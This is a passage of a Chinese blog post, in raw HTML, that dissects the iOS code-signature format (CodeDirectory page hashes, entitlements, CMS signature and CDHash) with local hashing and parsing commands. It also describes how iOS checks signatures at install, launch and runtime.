</span><span class='line'><span class="k">struct</span> <span class="n">__BlobIndex</span> <span class="p">{</span>
</span><span class='line'>    <span class="kt">uint32_t</span> <span class="n">type</span><span class="p">;</span>    <span class="cm">/* 0x1000 -&gt; Code Directory */</span>
</span><span class='line'>    <span class="kt">uint32_t</span> <span class="n">offset</span><span class="p">;</span>  <span class="cm">/* 0x475 -&gt; 0xD300 + 0x475 = 0xD775 */</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="k">struct</span> <span class="n">__BlobIndex</span> <span class="p">{</span>
</span><span class='line'>    <span class="kt">uint32_t</span> <span class="n">type</span><span class="p">;</span>    <span class="cm">/* 0x10000 -&gt; CMS Signature */</span>
</span><span class='line'>    <span class="kt">uint32_t</span> <span class="n">offset</span><span class="p">;</span>  <span class="cm">/* 0x746 -&gt; 0xD300 + 0x746 = 0xDA46 */</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>这部分是典型的数据头结构，声明了5个Blob，以及每个Blob的类型和相对签名头部的偏移量。接下来把每个部分分别提取出来进行分析。</p>

<h4>CodeDirectory</h4>

<p>CodeDirectory是签名数据中最终要的部分，直译过来就是代码目录，其实里面是整个MachO文件的哈希值，这里的哈希并不是一次性对整个文件进行哈希，而是将MachO文件按照pageSize(一般是4k也就是4096字节)进行分页，每一页单独计算哈希，并按照顺序保存下来，就像目录一样。</p>

<p>细心的同学会发现上面的数据中出现了两个CodeDirectory，type分别是<code>0x0</code>和<code>0x1000</code>，这也是历史遗留问题，<code>0x0</code>对应的是旧版本的代码签名，使用sha1算法进行哈希值的计算，而<code>0x1000</code>是后来引入的，采用sha256作为哈希算法，除了算法和哈希的长度不同之外，其他内容基本是一样的。取第一个进行分析：</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="c1">// 绿色部分③ Offset: 0xD334</span>
</span><span class='line'><span class="k">struct</span> <span class="n">__CodeDirectory</span> <span class="p">{</span>
</span><span class='line'>    <span class="kt">uint32_t</span> <span class="n">magic</span><span class="p">;</span>         <span class="cm">/* 0xFADE0C02 -&gt; CSMAGIC_CODEDIRECTORY */</span>
</span><span class='line'>    <span class="kt">uint32_t</span> <span class="n">length</span><span class="p">;</span>        <span class="cm">/* 0x1ED -&gt; 493 */</span>
</span><span class='line'>    <span class="kt">uint32_t</span> <span class="n">version</span><span class="p">;</span>       <span class="cm">/* 0x00020400 -&gt; v2.4.0 */</span>
</span><span class='line'>    <span class="kt">uint32_t</span> <span class="n">flags</span><span class="p">;</span>         <span class="cm">/* 0 */</span>
</span><span class='line'>    <span class="kt">uint32_t</span> <span class="n">hashOffset</span><span class="p">;</span>    <span class="cm">/* 0xD5 -&gt; 0xD334 + 0xD5 = 0xD409 指向⑤*/</span>
</span><span class='line'>    <span class="kt">uint32_t</span> <span class="n">identOffset</span><span class="p">;</span>   <span class="cm">/* 0x58 -&gt; 0xD334 + 0x58 = 0xD38B 指向④*/</span>
</span><span class='line'>    <span class="kt">uint32_t</span> <span class="n">nSpecialSlots</span><span class="p">;</span> <span class="cm">/* 5 */</span>
</span><span class='line'>    <span class="kt">uint32_t</span> <span class="n">nCodeSlots</span><span class="p">;</span>    <span class="cm">/* 0xE -&gt; 14 */</span>
</span><span class='line'>    <span class="kt">uint32_t</span> <span class="n">codeLimit</span><span class="p">;</span>     <span class="cm">/* 0xD300 */</span>
</span><span class='line'>    <span class="kt">uint8_t</span> <span class="n">hashSize</span><span class="p">;</span>       <span class="cm">/* 0x14 -&gt; 20bytes -&gt; 160bits (sha1) */</span>
</span><span class='line'>    <span class="kt">uint8_t</span> <span class="n">hashType</span><span class="p">;</span>       <span class="cm">/* 0x01 (sha1) */</span>
</span><span class='line'>    <span class="kt">uint8_t</span> <span class="n">spare1</span><span class="p">;</span>         <span class="cm">/* unused (must be zero) */</span>
</span><span class='line'>    <span class="kt">uint8_t</span> <span class="n">pageSize</span><span class="p">;</span>       <span class="cm">/* 0x0C -&gt; 2 ^ 0x0C = 0x1000 = 4096 */</span>
</span><span class='line'>    <span class="kt">uint32_t</span> <span class="n">spare2</span><span class="p">;</span>        <span class="cm">/* unused (must be zero) */</span>
</span><span class='line'>    <span class="cm">/* followed by dynamic content as located by offset fields above */</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>hashOffset就是&#8221;目录&#8221;第一页的偏移，从这个位置(0xD409)可以提取到一串20字节的sha1值(图中黄色⑤):</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="mi">9</span><span class="n">D452342F9ED06189E4F099BCA7CB68D6432F775</span>
</span></code></pre></td></tr></table></div></figure>


<p>这个值代表的就是该文件第一页的哈希值，通过以下命令计算文件前4096字节的sha1可进行验证</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>dd <span class="nv">bs</span><span class="o">=</span>1 <span class="nv">skip</span><span class="o">=</span>0 <span class="nv">count</span><span class="o">=</span>0x1000 <span class="k">if</span><span class="o">=</span>TestCodeSign 2&gt;/dev/null <span class="p">|</span> shasum -a 1
</span><span class='line'>9d452342f9ed06189e4f099bca7cb68d6432f775  -
</span></code></pre></td></tr></table></div></figure>


<p>而紧接着的20个字节就是第二页的哈希值，以此类推，直到原始文件的最后一页。</p>

<p>由于文件不一定是pageSize的整数倍，最后一页往往不足&#8221;一整页&#8221;的大小，因此需要额外的字段<code>codeLimit</code>记录文件的实际大小，也就是需要签名的数据的实际大小，通过这个值计算出最后一页的实际大小，并提取相应数据计算最后一页的签名。例子中<code>codeLimit=0xD300</code>，很容易得出最后一页大小为<code>0x300</code></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>dd <span class="nv">bs</span><span class="o">=</span>1 <span class="nv">skip</span><span class="o">=</span>0xD000 <span class="nv">count</span><span class="o">=</span>0x300 <span class="k">if</span><span class="o">=</span>TestCodeSign 2&gt;/dev/null <span class="p">|</span> shasum -a 1
</span><span class='line'>9dc960fc86f803c1fa100f2a1145cf7cbe58e803  -
</span></code></pre></td></tr></table></div></figure>


<p>计算出最后一页的sha1值与CodeDirectory中(图中黄色⑥)一致。</p>

<p>nCodeSlots记录了文件的总页数14，可通过<code>0xD300 / 0x1000 = 13.1875</code>得出确实是14页。</p>

<p>细心的朋友已经发现了，④ identifier和 ⑤ hashSlots 之间有一段多出的数据⑦，并且CodeDirectory中还有一个奇怪的值<code>nSpecialSlots=5</code>，整个文件的哈希值都已经包含在⑤和⑥之间了，这多出来的数据是怎么回事呢？</p>

<p>原来，在第一页的前面，还有5个特殊的负数页，用来保存这些额外信息的哈希值。</p>

<table>
<thead>
<tr>
<th></th>
<th> 序号 </th>
<th>                       对应内容                   </th>
</tr>
</thead>
<tbody>
<tr>
<td></td>
<td> -1   </td>
<td> App根目录的Info.plist文件                             </td>
</tr>
<tr>
<td></td>
<td> -2   </td>
<td> Requirements(代码签名的第二部分)                      </td>
</tr>
<tr>
<td></td>
<td> -3   </td>
<td> Resource Directory (_CodeSignature/CodeResources文件) </td>
</tr>
<tr>
<td></td>
<td> -4   </td>
<td> 暂未使用                                              </td>
</tr>
<tr>
<td></td>
<td> -5   </td>
<td> Entitlements (代码签名的第三部分)                     </td>
</tr>
</tbody>
</table>


<p>同样地，出于性能考虑，这些哈希值并未经过任何加密，只需要确保这些哈希值未经篡改，就可以说明代码本身没有被篡改。</p>

<h4>Requirements</h4>

<p>用于指定签名校验时的一些额外的约束，签名时codesign命令会自动生成这部分数据，但目前并没有看到什么地方使用了它，就不深入分析了，官方文档有对这部分内容的详细描述</p>

<ul>
<li><a href="https://developer.apple.com/library/archive/documentation/Security/Conceptual/CodeSigningGuide/Introduction/Introduction.html">Code Signing Tasks</a></li>
<li><a href="https://developer.apple.com/library/archive/documentation/Security/Conceptual/CodeSigningGuide/RequirementLang/RequirementLang.html#//apple_ref/doc/uid/TP40005929-CH5-SW1">Code Signing Requirement Language</a></li>
</ul>


<h4>Entitlements</h4>

<p><img src="http://xelz.info/assets/2019/codesign3.png" alt="" /></p>

<p>通过头部的偏移定位到数据的位置，显然，这是一个Blob结构</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">struct</span> <span class="n">__Blob</span> <span class="p">{</span>       <span class="cm">/* Address: 0xD5CD */</span>
</span><span class='line'>    <span class="kt">uint32_t</span> <span class="n">magic</span><span class="p">;</span>   <span class="cm">/* 0xFADE7171 -&gt; CSMAGIC_ENTITLEMENT */</span>
</span><span class='line'>    <span class="kt">uint32_t</span> <span class="n">length</span><span class="p">;</span>  <span class="cm">/* 0x1A8 -&gt; 424 */</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>之前由Xcode生成的Entitlements文件被整个嵌入到签名数据中。</p>

<h4>CMS Signature</h4>

<p>CMS是<code>Cryptographic Message Syntax</code>的缩写，是一种标准的签名格式，由<a href="https://www.ietf.org/rfc/rfc3852.txt">RFC3852</a>定义。还记得Provisioning Profile的签名吗？它们是相同的格式。CMS格式的签名中，除了包含前面我们推导出的加密哈希和证书之外，还承载了一些其他的信息。由于是二进制格式，不方便分析，可以将其内容从MachO文件中剥离出来，再找合适的工具进行解析。根据偏移量定位到CMS Signature的位置<code>0xDA46</code></p>

<p><img src="http://xelz.info/assets/2019/codesign4.png" alt="" /></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">struct</span> <span class="n">__Blob</span> <span class="p">{</span>       <span class="cm">/* Address: 0xDA46 */</span>
</span><span class='line'>    <span class="kt">uint32_t</span> <span class="n">magic</span><span class="p">;</span>   <span class="cm">/* 0xFADE0B01 -&gt; CSMAGIC_BLOBWRAPPER */</span>
</span><span class='line'>    <span class="kt">uint32_t</span> <span class="n">length</span><span class="p">;</span>  <span class="cm">/* 0x12D8 -&gt; 4824 */</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>除去头部的8个字节，把对应的内容提取出来</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>dd <span class="nv">bs</span><span class="o">=</span>1 <span class="nv">skip</span><span class="o">=</span>0xDA4E <span class="nv">count</span><span class="o">=</span>0x12D0 <span class="k">if</span><span class="o">=</span>TestCodeSign <span class="nv">of</span><span class="o">=</span>cms_signature
</span></code></pre></td></tr></table></div></figure>


<p>可以将导出的cms_signature文件上传到<a href="http://lapo.it/asn1js/">在线ASN.1解析工具</a>(支持CMS格式解析)进行分析</p>

<p><img src="http://xelz.info/assets/2019/codesign5.png" alt="" /></p>

<p>文件被解析为树状结构，看起来还是不够直观，因为这个工具只是按照数据格式把内容进行了格式化，但是并没有标注所有字段的确切含义。其实我们还可以使用openssl进行查看，但是因为Mac上自带的openssl以及通过HomeBrew安装的openssl都是没有开启cms支持的，所以可以将文件拷贝到linux机器上或者自行编译openssl进行查看，具体方法在此不表。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>openssl cms -cmsout -print -inform DER -in cms_signature
</span><span class='line'>CMS_ContentInfo:
</span><span class='line'>  contentType: pkcs7-signedData <span class="o">(</span>1.2.840.113549.1.7.2<span class="o">)</span>
</span><span class='line'>  d.signedData:
</span><span class='line'>    version: 1
</span><span class='line'>    digestAlgorithms:
</span><span class='line'>        algorithm: sha256 <span class="o">(</span>2.16.840.1.101.3.4.2.1<span class="o">)</span>
</span><span class='line'>        parameter: NULL
</span><span class='line'>    encapContentInfo:
</span><span class='line'>      eContentType: pkcs7-data <span class="o">(</span>1.2.840.113549.1.7.1<span class="o">)</span>
</span><span class='line'>      eContent: &lt;ABSENT&gt;
</span><span class='line'>    certificates:
</span><span class='line'>      ... <span class="o">[</span>stripped<span class="o">]</span> Apple Worldwide Developer Relations Certification Authority
</span><span class='line'>      ... <span class="o">[</span>stripped<span class="o">]</span> Apple Root CA
</span><span class='line'>      ... <span class="o">[</span>stripped<span class="o">]</span> iPhone Developer: xxxxxxx
</span><span class='line'>    signerInfos:
</span><span class='line'>        version: 1
</span><span class='line'>        d.issuerAndSerialNumber:
</span><span class='line'>          issuer: <span class="nv">C</span><span class="o">=</span>US, <span class="nv">O</span><span class="o">=</span>Apple Inc., <span class="nv">OU</span><span class="o">=</span>Apple Worldwide Developer Relations, <span class="nv">CN</span><span class="o">=</span>Apple Worldwide Developer Relations Certification Authority
</span><span class='line'>          serialNumber: 1008862887770590428
</span><span class='line'>        digestAlgorithm:
</span><span class='line'>          algorithm: sha256 <span class="o">(</span>2.16.840.1.101.3.4.2.1<span class="o">)</span>
</span><span class='line'>          parameter: NULL
</span><span class='line'>        signedAttrs:
</span><span class='line'>            ... <span class="o">[</span>stripped<span class="o">]</span>
</span><span class='line'>              SEQUENCE:
</span><span class='line'>    0:d<span class="o">=</span>0  <span class="nv">hl</span><span class="o">=</span>2 <span class="nv">l</span><span class="o">=</span>  29 cons: SEQUENCE
</span><span class='line'>    2:d<span class="o">=</span>1  <span class="nv">hl</span><span class="o">=</span>2 <span class="nv">l</span><span class="o">=</span>   5 prim:  OBJECT            :sha1
</span><span class='line'>    9:d<span class="o">=</span>1  <span class="nv">hl</span><span class="o">=</span>2 <span class="nv">l</span><span class="o">=</span>  20 prim:  OCTET STRING      <span class="o">[</span>HEX DUMP<span class="o">]</span>:669421362B2F2B5303BCEBB47D793A75A6BBD32F
</span><span class='line'>
</span><span class='line'>            ... <span class="o">[</span>stripped<span class="o">]</span>
</span><span class='line'>        signatureAlgorithm:
</span><span class='line'>          algorithm: rsaEncryption <span class="o">(</span>1.2.840.113549.1.1.1<span class="o">)</span>
</span><span class='line'>          parameter: NULL
</span><span class='line'>        signature:
</span><span class='line'>          0000 - 77 00 50 9c 5c 6d 50 1e-cb 4b ca b7 91 d3 5b   w.P.<span class="se">\m</span>P..K....<span class="o">[</span>
</span><span class='line'>          000f - 2e 28 fe f3 5d 20 73 ef-0a 59 ac 2e ed bd 2a   .<span class="o">(</span>..<span class="o">]</span> s..Y....*
</span><span class='line'>          ... <span class="o">[</span>stripped<span class="o">]</span>
</span><span class='line'>        unsignedAttrs:
</span><span class='line'>          &lt;EMPTY&gt;
</span></code></pre></td></tr></table></div></figure>


<p>由于输出内容太多，将部分内容做了删减，可以观察到签名中主要包含了这些内容</p>

<ul>
<li><strong>contentType</strong>， 表明消息的类型，有6种取值，这里使用的是表示签名的signedData类型

<ul>
<li>Data</li>
<li>SignedData</li>
<li>EnvelopedData</li>
<li>DigestedData</li>
<li>EncryptedData</li>
<li>AuthenticatedData</li>
</ul>
</li>
<li><strong>content</strong>，SignedData类型的数据

<ul>
<li>version等：略</li>
<li>certificates： 证书链，包含用于签名的开发者证书及所有上游CA的证书</li>
<li>signerInfos：真正的签名信息！

<ul>
<li>version：版本号</li>
<li>issuerAndSerialNumber：签名者信息，根据签名者的名称找到证书链中对应的证书，使用证书中的公钥即可验证签名是否有效</li>
<li>digestAlgorithm：哈希算法</li>
<li>signedAttrs：需要签名的属性, 是可选项，为空表示被签名的数据是原始文件的内容，如果不为空则至少要包含原始文件的类型以及其哈希值，此时被签名的数据就是signedAttrs的内容</li>
<li>signatureAlgorithm：签名算法，这里指对哈希值进行加密所使用的算法</li>
<li>signature：加密后的哈希值</li>
</ul>
</li>
</ul>
</li>
</ul>


<p>由于在Code Directory中已经保存了所有资源及代码的哈希值，那么我们只需要确保CodeDirectory不被篡改，即可确保整个app的完整性， 因此CMS Signature中只需要对CodeDirectory进行签名即可。而signedAttrs中支持这样一种特性：可以先计算被签名数据的哈希，然后再对哈希值进行签名。听起来有点绕，不过仔细体会一下应该不难理解。</p>

<p>我们把CodeDirectory的内容抠出来，计算其哈希值，以第一个CodeDirectory为例，计算其sha1：</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>dd <span class="nv">bs</span><span class="o">=</span>1 <span class="nv">skip</span><span class="o">=</span>0xD334 <span class="nv">count</span><span class="o">=</span>0x1ED <span class="k">if</span><span class="o">=</span>TestCodeSign 2&gt;/dev/null <span class="p">|</span> shasum -a 1
</span><span class='line'>669421362b2f2b5303bcebb47d793a75a6bbd32f  -
</span></code></pre></td></tr></table></div></figure>


<p>这个值叫做CDHash(Code Directory&rsquo;s Hash)，对比前面从cms_signature中解析出的 signedAttrs，会发现这两个值是一样的，也就是说CodeDirectory的哈希值被放在了signerInfos->signedAttrs中，作为最终真正被<code>签名</code>(计算哈希并加密)的内容。</p>

<p>至此，我们已经从头到尾剖析了iOS代码签名的生成方式及数据结构，在这个过程中，至少存在4次计算哈希的行为，并且是环环相扣的</p>

<ol>
<li>_CodeSignature/CodeResources中对每个资源文件计算哈希</li>
<li>Code Directory 中对MachO文件本身的每个分页，以及Info.plist、CodeResources、Entitlements等文件计算哈希</li>
<li>CMS Signature的signedAttrs中对Code Directory计算哈希</li>
<li>对signedAttrs计算哈希并使用开发者的私钥加密</li>
</ol>


<p>只有最后一步的哈希值是被加密的， 前面几步的哈希值是否加密都不影响签名的效果，只要任意内容有变化，均会因某个环节的哈希不匹配而导致签名校验的失败。</p>

<h4>jtool</h4>

<p>相信上面的二进制分析已经让你眼花缭乱了，不过已经有大神做出了<a href="http://www.newosxbook.com/tools/jtool.tar">jtool</a>这个工具，它是一款强大的MachO二进制分析工具，用来替代otool、nm、segedit等命令，也包括codesign的部分功能。通过以下命令可以将代码签名解析为可读的文本格式</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>jtool --sig -vv TestCodeSign
</span><span class='line'>Blob at offset: 54016 <span class="o">(</span>19888 bytes<span class="o">)</span> is an embedded signature of 6686 bytes, and 5 blobs
</span><span class='line'>  Blob 0: Type: 0 @52: Code Directory <span class="o">(</span>493 bytes<span class="o">)</span>
</span><span class='line'>      Version:     20400
</span><span class='line'>      Flags:       none <span class="o">(</span>0x0<span class="o">)</span>
</span><span class='line'>      CodeLimit:   0xd300
</span><span class='line'>      Identifier:  test.CodeSign <span class="o">(</span>0x58<span class="o">)</span>
</span><span class='line'>      Team ID:     xxxxxxxxxx <span class="o">(</span>0x66<span class="o">)</span>
</span><span class='line'>      Executable Segment: Base 0x00000000 Limit: 0x00000000 Flags: 0x00000000
</span><span class='line'>      CDHash:      669421362b2f2b5303bcebb47d793a75a6bbd32f <span class="o">(</span>computed<span class="o">)</span>
</span><span class='line'>      <span class="c"># of Hashes: 14 code + 5 special</span>
</span><span class='line'>      Hashes @213 size: 20 Type: SHA-1
</span><span class='line'>          Entitlements blob:  19a92ca549e53593b384681245de14897df2a9dd <span class="o">(</span>OK<span class="o">)</span>
</span><span class='line'>          Application Specific:   Not Bound
</span><span class='line'>          Resource Directory: fb7df05e17f3b347d6b64868f468def49feecf25 <span class="o">(</span>OK<span class="o">)</span>
</span><span class='line'>          Requirements blob:  9d58965211c9cd83b208fffd575d741881ff81e4 <span class="o">(</span>OK<span class="o">)</span>
</span><span class='line'>          Bound Info.plist:   89e1951413c3eb05fab8f6a5f06c13b48926eabe <span class="o">(</span>OK<span class="o">)</span>
</span><span class='line'>          Slot   0 <span class="o">(</span>File page @0x0000<span class="o">)</span>: 9d452342f9ed06189e4f099bca7cb68d6432f775 <span class="o">(</span>OK<span class="o">)</span>
</span><span class='line'>          ... <span class="o">[</span>stripped<span class="o">]</span>
</span><span class='line'>  ... <span class="o">[</span>stripped<span class="o">]</span>
</span><span class='line'>  Blob 4: Type: 10000 @1862: Blob Wrapper <span class="o">(</span>4824 bytes<span class="o">)</span> <span class="o">(</span>0x10000 is CMS <span class="o">(</span>RFC3852<span class="o">)</span> signature<span class="o">)</span>
</span><span class='line'>CA: Apple Certification Authority CN: Apple Root CA
</span><span class='line'>... <span class="o">[</span>stripped<span class="o">]</span>
</span><span class='line'>Time: 190122095805Z
</span></code></pre></td></tr></table></div></figure>


<h4>Distribute App</h4>

<p>在Xcode Organizer中导出或者提交App时，Xcode会将Entitlements文件及embedded.mobileprovision文件替换为对应的版本，并使用对应的证书重新签名，主要区别如下</p>

<table>
<thead>
<tr>
<th></th>
<th> 类型        </th>
<th> Entitlements             </th>
<th> Provisioning Profile       </th>
<th> 证书           </th>
</tr>
</thead>
<tbody>
<tr>
<td></td>
<td> AppStore    </td>
<td> 不可调试，推送为生产环境 </td>
<td> 无ProvisionedDevices       </td>
<td> 发布证书       </td>
</tr>
<tr>
<td></td>
<td> Ad Hoc      </td>
<td> 不可调试，推送为生产环境 </td>
<td> 允许安装到已注册的测试设备 </td>
<td> 发布证书       </td>
</tr>
<tr>
<td></td>
<td> Development </td>
<td> 可调试，推送为测试环境   </td>
<td> 允许安装到已注册的测试设备 </td>
<td> 开发证书       </td>
</tr>
<tr>
<td></td>
<td> Enterprise  </td>
<td> 不可调试，推送为生产环境 </td>
<td> ProvisionAllDevices        </td>
<td> 企业级发布证书 </td>
</tr>
</tbody>
</table>


<h2>0x06 校验代码签名</h2>

<p>签名的校验并非一次性完成，在安装、启动、和运行时有着不同的校验规则。</p>

<h4>安装</h4>

<p>App安装时的校验由位于iOS设备上的/usr/lib/libmis.dylib (dyld_shared_cache)提供。</p>

<p><img src="http://xelz.info/assets/2019/libmis.png" alt="" /></p>

<p>App的安装是由<code>/usr/libexec/installd</code>完成的，<code>installd</code>会通过<code>libmis.dylib</code>校验ProvisioningProfile、Entitlements及签名的合法性，并递归地校验签名时每一个步骤生成的哈希值：CDHash, Code Directory, _CodeSignature/CodeResources。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>otool -L installd <span class="p">|</span> grep mis
</span><span class='line'>  /usr/lib/libmis.dylib <span class="o">(</span>compatibility version 1.0.0, current version 1.0.0<span class="o">)</span>
</span><span class='line'><span class="nv">$ </span>nm installd <span class="p">|</span> grep ValidateSignature
</span><span class='line'>                 U _MISValidateSignatureAndCopyInfo
</span><span class='line'>                 U _kMISValidationOptionValidateSignatureOnly
</span></code></pre></td></tr></table></div></figure>


<h4>启动</h4>

<p>进程启动时，loader会先将可执行文件加载到虚拟内存，在加载的过程中mach_loader会自动解析MachO文件中的LC_CODE_SIGNATURE并进行校验，可以参考mach_loader的代码 <a href="https://opensource.apple.com/source/xnu/xnu-4570.71.2/bsd/kern/mach_loader.c.auto.html">bsd/kern/mach_loader.c</a></p>

<p><img src="http://xelz.info/assets/2019/verify1.png" alt="" /></p>

<p><code>load_code_signature</code>在解析完签名的数据后会调用<code>mac_vnode_check_singature</code>函数进行验证，而这个函数会被名为<code>AFMI</code>(AppleMobileFileIntegrity)的内核扩展(kext)通过Hook的方式接管，而AFMI只是一层壳，最终也是调用了libmis.dylib来实现签名的校验，这一校验过程基本与安装时一致，防止安装后的篡改。</p>

<p>需要注意的是，加载过程中为了提升加载效率，签名校验并不会去检查Code Directory与实际的代码是否匹配，仅仅只检查了CMS Signature及CDHash的合法性。</p>

<h4>运行时</h4>

<p>当一页代码被加载到虚拟内存后，会立即触发<code>page fault</code>，此时内核中的<code>vm_fault</code>函数会被调用，紧接着调用<code>vm_fault_enter</code>，在<code>vm_fault_enter</code>的实现中会判断代码页是否需要签名校验，并执行校验的操作，参考代码<a href="https://opensource.apple.com/source/xnu/xnu-4570.71.2/osfmk/vm/vm_fault.c.auto.html">osfmk/vm/vm_fault.c</a></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">kern_return_t</span> <span class="nf">vm_fault_enter</span><span class="p">(...)</span> <span class="p">{</span>
</span><span class='line'><span class="c1">// ...</span>
</span><span class='line'>    <span class="cm">/* Validate code signature if necessary. */</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">VM_FAULT_NEED_CS_VALIDATION</span><span class="p">(</span><span class="n">pmap</span><span class="p">,</span> <span class="n">m</span><span class="p">,</span> <span class="n">object</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">vm_object_lock_assert_exclusive</span><span class="p">(</span><span class="n">object</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>      <span class="k">if</span> <span class="p">(</span><span class="n">m</span><span class="o">-&gt;</span><span class="n">cs_validated</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>          <span class="n">vm_cs_revalidates</span><span class="o">++</span><span class="p">;</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>      <span class="cm">/* VM map is locked, so 1 ref will remain on VM object -</span>
</span><span class='line'><span class="cm">      * so no harm if vm_page_validate_cs drops the object lock */</span>
</span><span class='line'>      <span class="n">vm_page_validate_cs</span><span class="p">(</span><span class="n">m</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="c1">// ...</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>对于宏<code>VM_FAULT_NEED_CS_VALIDATION</code>的解释是</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
